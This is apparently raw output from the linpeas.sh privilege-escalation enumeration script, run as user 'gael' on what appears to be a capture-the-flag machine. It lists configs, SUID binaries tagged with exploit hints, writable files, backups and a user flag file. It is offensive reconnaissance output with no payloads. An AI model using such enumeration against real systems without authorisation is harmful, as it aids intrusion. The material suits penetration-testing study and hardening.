        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        include /etc/nginx/mime.types;
        default_type application/octet-stream;
        ssl_prefer_server_ciphers on;
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
        gzip on;
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}
-rw-r--r-- 1 root root 1077 Mar 20  2024 /etc/nginx/fastcgi.conf
fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;
fastcgi_param  QUERY_STRING       $query_string;
fastcgi_param  REQUEST_METHOD     $request_method;
fastcgi_param  CONTENT_TYPE       $content_type;
fastcgi_param  CONTENT_LENGTH     $content_length;
fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
fastcgi_param  REQUEST_URI        $request_uri;
fastcgi_param  DOCUMENT_URI       $document_uri;
fastcgi_param  DOCUMENT_ROOT      $document_root;
fastcgi_param  SERVER_PROTOCOL    $server_protocol;
fastcgi_param  REQUEST_SCHEME     $scheme;
fastcgi_param  HTTPS              $https if_not_empty;
fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
fastcgi_param  REMOTE_ADDR        $remote_addr;
fastcgi_param  REMOTE_PORT        $remote_port;
fastcgi_param  SERVER_ADDR        $server_addr;
fastcgi_param  SERVER_PORT        $server_port;
fastcgi_param  SERVER_NAME        $server_name;
fastcgi_param  REDIRECT_STATUS    200;

-rw-r--r-- 1 root root 374 Mar 20  2024 /etc/ufw/applications.d/nginx                              

drwxr-xr-x 3 root root 4096 Jun  2 07:38 /usr/lib/nginx

-rwxr-xr-x 1 root root 1195152 Feb 14 18:44 /usr/sbin/nginx

drwxr-xr-x 2 root root 4096 Jun  2 07:38 /usr/share/doc/nginx

drwxr-xr-x 4 root root 4096 Jun  2 07:38 /usr/share/nginx
-rw-r--r-- 1 root root 42 Feb 14 18:44 /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
-rw-r--r-- 1 root root 40 Feb 14 18:44 /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
-rw-r--r-- 1 root root 52 Feb 14 18:44 /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
-rw-r--r-- 1 root root 53 Feb 14 18:44 /usr/share/nginx/modules-available/mod-http-image-filter.conf                                
load_module modules/ngx_http_image_filter_module.so;

drwxr-xr-x 7 root root 4096 Jun  2 07:38 /var/lib/nginx
find: ‘/var/lib/nginx/uwsgi’: Permission denied
find: ‘/var/lib/nginx/proxy’: Permission denied
find: ‘/var/lib/nginx/scgi’: Permission denied
find: ‘/var/lib/nginx/fastcgi’: Permission denied
find: ‘/var/lib/nginx/body’: Permission denied

drwxr-xr-x 2 root adm 4096 Jul  9 07:56 /var/log/nginx


╔══════════╣ Analyzing MariaDB Files (limit 70)                   

-rw------- 1 root root 317 Sep  9  2024 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Rsync Files (limit 70)                     
-rw-r--r-- 1 root root 1044 Nov 11  2022 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing PAM Auth Files (limit 70)                  
drwxr-xr-x 2 root root 4096 Jun  9 09:04 /etc/pam.d
-rw-r--r-- 1 root root 2133 Jan  2  2024 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing Ldap Files (limit 70)                      
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Sep  5  2024 /etc/ldap


╔══════════╣ Analyzing Keyring Files (limit 70)                   
drwxr-xr-x 2 root root 4096 Jun  9 09:03 /usr/share/keyrings




╔══════════╣ Analyzing FastCGI Files (limit 70)                   
-rw-r--r-- 1 root root 1007 Mar 20  2024 /etc/nginx/fastcgi_params

╔══════════╣ Analyzing Postfix Files (limit 70)                   
-rw-r--r-- 1 root root 813 Feb  2  2020 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing DNS Files (limit 70)                       
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind                




╔══════════╣ Analyzing Interesting logs Files (limit 70)          
-rw-r--r-- 1 www-data root 0 Jun  9 09:56 /var/log/nginx/access.log                                

-rw-r--r-- 1 www-data root 0 Jun  9 09:56 /var/log/nginx/error.log

╔══════════╣ Analyzing Other Interesting Files (limit 70)         
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
-rw-r--r-- 1 gael gael 3771 Feb 25  2020 /home/gael/.bashrc





-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 gael gael 807 Feb 25  2020 /home/gael/.profile





╔══════════╣ Searching mysql credentials and exec                 
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user       = mysql

MySQL process not found.
╔══════════╣ Analyzing PGP-GPG Files (limit 70)                   
/usr/bin/gpg                     
netpgpkeys Not Found
netpgp Not Found                 

-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 3267 Mar 29 16:35 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 1150 Feb 19 13:15 /usr/share/keyrings/ubuntu-pro-anbox-cloud.gpg
-rw-r--r-- 1 root root 2247 Feb 19 13:15 /usr/share/keyrings/ubuntu-pro-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Feb 19 13:15 /usr/share/keyrings/ubuntu-pro-cis.gpg
-rw-r--r-- 1 root root 2236 Feb 19 13:15 /usr/share/keyrings/ubuntu-pro-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Feb 19 13:15 /usr/share/keyrings/ubuntu-pro-esm-infra.gpg
-rw-r--r-- 1 root root 2275 Feb 19 13:15 /usr/share/keyrings/ubuntu-pro-fips.gpg
-rw-r--r-- 1 root root 2275 Feb 19 13:15 /usr/share/keyrings/ubuntu-pro-fips-preview.gpg
-rw-r--r-- 1 root root 2250 Feb 19 13:15 /usr/share/keyrings/ubuntu-pro-realtime-kernel.gpg
-rw-r--r-- 1 root root 2235 Feb 19 13:15 /usr/share/keyrings/ubuntu-pro-ros.gpg
-rw-r--r-- 1 root root 2867 Feb 13  2020 /usr/share/popularity-contest/debian-popcon.gpg


╔══════════╣ Searching uncommon passwd files (splunk)             
passwd file: /etc/pam.d/passwd   
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd        
passwd file: /usr/share/lintian/overrides/passwd                  

╔══════════╣ Searching ssl/ssh files                              
╔══════════╣ Analyzing SSH Files (limit 70)                       




-rw------- 1 gael gael 0 Sep  7  2024 /home/gael/.ssh/authorized_keys                              

-rw-r--r-- 1 root root 605 Sep  7  2024 /etc/ssh/ssh_host_dsa_key.pub                              
-rw-r--r-- 1 root root 177 Sep  7  2024 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 97 Sep  7  2024 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 569 Sep  7  2024 /etc/ssh/ssh_host_rsa_key.pub                              

ChallengeResponseAuthentication no
UsePAM yes
══╣ Some certificates were found (out limited):                   
/etc/pki/fwupd/LVFS-CA.pem       
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Atos_TrustedRoot_Root_CA_ECC_TLS_2021.pem
/etc/ssl/certs/Atos_TrustedRoot_Root_CA_RSA_TLS_2021.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
1955PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
══╣ Some home ssh config file was found                           
/usr/share/openssh/sshd_config   
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:        
/etc/hosts.allow                 


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Searching tmux sessions                              
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions                               
tmux 3.0a                        


/tmp/tmux-1000



                      ╔════════════════════════════════════╗      
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                 
                      ╚════════════════════════════════════╝      
╔══════════╣ SUID - Check easy privesc, exploits and write perms  
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid    
-rwsr-xr-x 1 root root 87K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 84K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10                           
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20                         
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 52K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 55K Apr  9  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8         
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                               
-rwsr-xr-x 1 root root 67K Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 67K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)               
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)     
-rwsr-xr-x 1 root root 39K Apr  9  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)                  
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper          
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1                 
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device                          
-rwsr-xr-x 1 root root 467K Apr 11 12:16 /usr/lib/openssh/ssh-keysign                              

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid    
ICMP is not accessible           
-rwxr-sr-x 1 root shadow 83K Feb  6  2024 /usr/bin/chage
-rwxr-sr-x 1 root ssh 343K Apr 11 12:16 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 31K Feb  6  2024 /usr/bin/expiry
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)     
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 43K Jan 10  2024 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 43K Jan 10  2024 /usr/sbin/pam_extrausers_chkpwd                          
-rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter

╔══════════╣ Files with ACLs (limited to 50)                      
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls             
files with acls in searched folders Not Found                     

╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities     
══╣ Current shell capabilities   
./linpeas.sh: 7548: [[: not found
CapInh:  [Invalid capability format]
./linpeas.sh: 7548: [[: not found
CapPrm:  [Invalid capability format]
./linpeas.sh: 7539: [[: not found
CapEff:  [Invalid capability format]
./linpeas.sh: 7548: [[: not found
CapBnd:  [Invalid capability format]
./linpeas.sh: 7548: [[: not found
CapAmb:  [Invalid capability format]

╚ Parent process capabilities
./linpeas.sh: 7573: [[: not found
CapInh:  [Invalid capability format]
./linpeas.sh: 7573: [[: not found
CapPrm:  [Invalid capability format]
./linpeas.sh: 7564: [[: not found
CapEff:  [Invalid capability format]
./linpeas.sh: 7573: [[: not found
CapBnd:  [Invalid capability format]
./linpeas.sh: 7573: [[: not found
CapAmb:  [Invalid capability format]


Files with capabilities (limited to 50):
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep                     
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

╔══════════╣ Users with capabilities                              
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities     

╔══════════╣ Checking misconfigurations of ld.so                  
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso             
/etc/ld.so.conf                  
Content of /etc/ld.so.conf:      
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf                
  - /usr/lib/x86_64-linux-gnu/libfakeroot                         
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib               
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf                         
  - /usr/local/lib/x86_64-linux-gnu                               
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/                   
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files   
total 32                         
drwxr-xr-x   2 root root 4096 Jun  9 09:02 .
drwxr-xr-x 107 root root 4096 Jun 18 13:19 ..
-rw-r--r--   1 root root   96 Dec  5  2019 01-locale-fix.sh
-rw-r--r--   1 root root  729 Feb  2  2020 bash_completion.sh
-rw-r--r--   1 root root 1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--   1 root root 1107 Nov  3  2019 gawk.csh
-rw-r--r--   1 root root  757 Nov  3  2019 gawk.sh
-rw-r--r--   1 root root 1557 Feb 17  2020 Z97-byobu.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d       
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                        

╔══════════╣ AppArmor binary profiles                             
-rw-r--r-- 1 root root  3500 Jan 31  2023 sbin.dhclient
-rw-r--r-- 1 root root  3202 Feb 25  2020 usr.bin.man
-rw-r--r-- 1 root root  2006 Jul 24  2024 usr.sbin.mysqld
-rw-r--r-- 1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1674 Feb  8  2024 usr.sbin.tcpdump

═╣ Hashes inside passwd file? ........... No                      
═╣ Writable passwd file? ................ No                      
═╣ Credentials in fstab/mtab? ........... No                      
═╣ Can I read shadow files? ............. No                      
═╣ Can I read shadow plists? ............ No                      
═╣ Can I write shadow plists? ........... No                      
═╣ Can I read opasswd file? ............. No                      
═╣ Can I write in network-scripts? ...... No                      
═╣ Can I read root folder? .............. No                      

╔══════════╣ Searching root files in home dirs (limit 30)         
/home/                           
/home/gael/.sqlite_history
/home/gael/.python_history
/home/gael/user.txt
/home/gael/.bash_history
/root/
/var/www
/var/www/html
/var/www/html/index.nginx-debian.html

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)               
-rw-r----- 1 root gael 33 Jul  9 07:57 /home/gael/user.txt

╔══════════╣ Readable files belonging to root and readable by me but not world readable            
-rw-r----- 1 root gael 33 Jul  9 07:57 /home/gael/user.txt
-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 /var/backups/backrest_backup.tar.gz                 

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files   
/dev/mqueue                      
/dev/shm
/etc/laurel/config.toml
/home/gael
/run/lock
/run/screen
/run/screen/S-gael
/run/user/1000
/run/user/1000/dbus-1
/run/user/1000/dbus-1/services
/run/user/1000/gnupg
/run/user/1000/inaccessible
/run/user/1000/systemd
/run/user/1000/systemd/units
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/.Test-unix
/tmp/tmux-1000
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)                              
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files   
  Group gael:                    
/tmp/linpeas.sh                  
/etc/laurel/config.toml



                            ╔═════════════════════════╗           
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                
                            ╚═════════════════════════╝           
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                            
/usr/bin/gettext.sh              
/usr/bin/rescan-scsi-bus.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2025-07-09+08:50:59.9224807240 /tmp/linpeas.sh
2025-06-09+09:47:50.9530830600 /usr/local/sbin/laurel
2025-03-03+21:18:52.1240190480 /usr/local/bin/backrest
2025-03-03+04:28:57.3479867980 /opt/backrest/install.sh
2025-03-03+04:28:26.4319876080 /opt/backrest/restic
2024-10-13+17:29:05.6560219520 /usr/local/bin/f2py3.8
2024-10-13+17:29:05.6560219520 /usr/local/bin/f2py3
2024-10-13+17:29:05.6560219520 /usr/local/bin/f2py
2024-10-01+21:30:59.0632721390 /usr/local/bin/pip3.8
2024-10-01+21:30:59.0632721390 /usr/local/bin/pip3
2024-10-01+21:30:59.0632721390 /usr/local/bin/pip
2024-10-01+21:28:48.4699185640 /usr/local/bin/flask
2024-10-01+21:27:36.9888260480 /usr/local/bin/wheel
2024-09-30+03:43:22.0360870960 /usr/local/bin/filetype
2024-09-30+03:43:18.8880870220 /usr/local/bin/bitmath
2024-09-30+03:43:18.4560870120 /usr/local/bin/pybabel
2024-09-30+03:43:16.3120869610 /usr/local/bin/pysemver
2024-09-30+03:43:16.2880869600 /usr/local/bin/cheroot

╔══════════╣ Unexpected in /opt (usually empty)                   
total 12                         
drwxr-xr-x  3 root root 4096 Mar  4 22:19 .
drwxr-xr-x 18 root root 4096 Mar  3 02:50 ..
drwxr-xr-x  5 root root 4096 Jul  9 08:50 backrest

╔══════════╣ Unexpected in root

╔══════════╣ Modified interesting files in the last 5mins (limit 100)                              
/home/gael/.gnupg/trustdb.gpg    
/home/gael/.gnupg/pubring.kbx
/opt/backrest/oplog.sqlite-wal
/opt/backrest/oplog.sqlite-shm
/opt/backrest/.config/backrest/config.json
/opt/backrest/tasklogs/logs.sqlite-shm
/opt/backrest/tasklogs/logs.sqlite-wal
/opt/backrest/oplog.sqlite
/opt/backrest/processlogs/backrest.log
/var/log/auth.log
/var/log/journal/006168b2a7004abd80ae5e2460ebe2cf/user-1000.journal
/var/log/journal/006168b2a7004abd80ae5e2460ebe2cf/user-1000@b8d832ebcae04850946980954a4736ee-000000000000a106-0006372061e45040.journal
/var/log/journal/006168b2a7004abd80ae5e2460ebe2cf/system.journal
/var/log/journal/006168b2a7004abd80ae5e2460ebe2cf/user-1001.journal
/var/log/journal/006168b2a7004abd80ae5e2460ebe2cf/system@bfc5ecffb479499cbe801c83f43e6d64-0000000000000001-0006372095b9b392.journal
/var/log/syslog
/var/log/laurel/audit.log
/var/log/laurel/audit.log.1

╔══════════╣ Writable log files (logrotten) (limit 50)            
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#logrotate-exploitation                            
logrotate 3.14.0                 

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes
╔══════════╣ Syslog configuration (limit 50)                      



module(load="imuxsock") # provides support for local system logging                                



module(load="imklog" permitnonkernelfacility="on")                


$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat          

$RepeatedMsgReduction on

$FileOwner syslog
$FileGroup adm
$FileCreateMode 0640
$DirCreateMode 0755
$Umask 0022
$PrivDropToUser syslog
$PrivDropToGroup syslog

$WorkDirectory /var/spool/rsyslog

$IncludeConfig /etc/rsyslog.d/*.conf                              
╔══════════╣ Auditd configuration (limit 50)                      
auditd configuration Not Found   
╔══════════╣ Log files with potentially weak perms (limit 50)     
      670      4 -rw-r-----   1 syslog   adm          3148 Jul  9 08:52 /var/log/auth.log          
       35     28 -rw-r--r--   1 root     adm                 24739 Jun 18 13:15 /var/log/dmesg.1.gz
      612    660 -rw-r-----   1 syslog   adm                673870 Jul  9 07:56 /var/log/syslog.1  
      289      0 -rw-r-----   1 syslog   adm                     0 Jul  9 07:56 /var/log/kern.log  
      654    492 -rw-r-----   1 syslog   adm                500145 Jul  9 07:56 /var/log/kern.log.1
      354      0 -rw-r-----   1 root     adm                     0 Jul  9 07:56 /var/log/apt/term.log                               
      385      4 -rw-r-----   1 root     adm                  1145 Jun  9 10:48 /var/log/apt/term.log.1.gz                          
      291    128 -rw-r--r--   1 root     adm                129334 Jun 18 13:35 /var/log/dmesg.0   
      655      8 -rw-r-----   1 syslog   adm                  6208 Jul  9 07:56 /var/log/auth.log.1
      522    100 -rw-r-----   1 syslog   adm                 98460 Jun 18 10:06 /var/log/kern.log.2.gz                              
      308    824 -rw-r-----   1 www-data adm                842799 Jul  9 08:22 /var/log/nginx/application.access.log               
      294      0 -rw-r--r--   1 www-data root                    0 Jun  9 09:56 /var/log/nginx/error.log                            
      602      0 -rw-r-----   1 www-data adm                     0 Jun 18 10:06 /var/log/nginx/appliation.error.log                 
      303      0 -rw-r--r--   1 www-data root                    0 Jun  9 09:56 /var/log/nginx/access.log                           
      604      4 -rw-r-----   1 www-data adm                  1189 Jun 18 10:08 /var/log/nginx/application.access.log.1             
      323     40 -rw-r-----   1 syslog   adm                 33176 Jul  9 08:52 /var/log/syslog    
      293    136 -rw-r-----   1 syslog   adm                137197 Jun 18 10:06 /var/log/syslog.2.gz                                
      331      4 -rw-r-----   1 syslog   adm                  1039 Jun 18 10:06 /var/log/auth.log.2.gz                              
      287     24 -rw-r--r--   1 root     adm                 24556 Jun 18 10:06 /var/log/dmesg.2.gz
      279    128 -rw-r--r--   1 root     adm                127730 Jul  9 07:56 /var/log/dmesg     
      470     28 -rw-r--r--   1 root     adm                 25050 Jun  9 10:45 /var/log/dmesg.4.gz
       36   4884 -rw-------   1 _laurel  _laurel           5000272 Jun 18 10:06 /var/log/laurel/audit.log.3                         
      600   4888 -rw-------   1 _laurel  _laurel           5000459 Jul  9 08:10 /var/log/laurel/audit.log.2                         
      217   4888 -rw-------   1 _laurel  _laurel           5000572 Jun  9 10:52 /var/log/laurel/audit.log.4                         
      218   3336 -rw-------   1 _laurel  _laurel           3412543 Jul  9 08:52 /var/log/laurel/audit.log                           
      429   4884 -rw-------   1 _laurel  _laurel           5000136 Jul  9 08:52 /var/log/laurel/audit.log.1                         
      273     28 -rw-r--r--   1 root     adm                 25040 Jun  9 13:48 /var/log/dmesg.3.gz

╔══════════╣ Files inside /home/gael (limit 20)                   
total 36                         
drwxr-x--- 5 gael gael 4096 Jul  9 08:52 .
drwxr-xr-x 4 root root 4096 Jun 18 13:19 ..
lrwxrwxrwx 1 root root    9 Oct 19  2024 .bash_history -> /dev/null
-rw-r--r-- 1 gael gael  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gael gael 3771 Feb 25  2020 .bashrc
drwx------ 2 gael gael 4096 Sep  7  2024 .cache
drwx------ 3 gael gael 4096 Jul  9 08:52 .gnupg
-rw-r--r-- 1 gael gael  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root    9 Oct 19  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 19  2024 .sqlite_history -> /dev/null
drwx------ 2 gael gael 4096 Sep  7  2024 .ssh
-rw-r----- 1 root gael   33 Jul  9 07:57 user.txt

╔══════════╣ Files inside others home (limit 20)                  
/var/www/html/index.nginx-debian.html

╔══════════╣ Searching installed mail applications                

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup folders
drwx------ 2 root root 4096 Sep 11  2024 /etc/lvm/backup
drwxr-xr-x 2 root root 4096 Jul  9 08:17 /var/backups
total 51220
-rw-r--r-- 1 root root      38602 Jun  9 10:48 apt.extended_states.0
-rw-r--r-- 1 root root       4253 Jun  9 09:02 apt.extended_states.1.gz
-rw-r--r-- 1 root root       4206 Jun  2 07:42 apt.extended_states.2.gz
-rw-r--r-- 1 root root       4190 May 27 13:07 apt.extended_states.3.gz
-rw-r--r-- 1 root root       4383 Oct 27  2024 apt.extended_states.4.gz
-rw-r--r-- 1 root root       4379 Oct 19  2024 apt.extended_states.5.gz
-rw-r--r-- 1 root root       4367 Oct 14  2024 apt.extended_states.6.gz
-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 backrest_backup.tar.gz


╔══════════╣ Backup files (limited 100)                           
-rw-r--r-- 1 root root 1759 Dec 16  2024 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 1398 Jun  9 09:04 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-38.pyc
-rw-r--r-- 1 root root 9073 Apr 11 19:12 /usr/lib/modules/5.4.0-216-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9833 Apr 11 19:12 /usr/lib/modules/5.4.0-216-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 44048 May  6 13:36 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 11886 Jun  9 09:04 /usr/share/info/dir.old
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 392817 Feb  9  2020 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 2756 Feb 13  2020 /usr/share/man/man8/vgcfgbackup.8.gz                      
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 0 Apr 11 19:12 /usr/src/linux-headers-5.4.0-216-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Apr 11 19:12 /usr/src/linux-headers-5.4.0-216-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 237900 Apr 11 19:12 /usr/src/linux-headers-5.4.0-216-generic/.config.old
-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-216/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
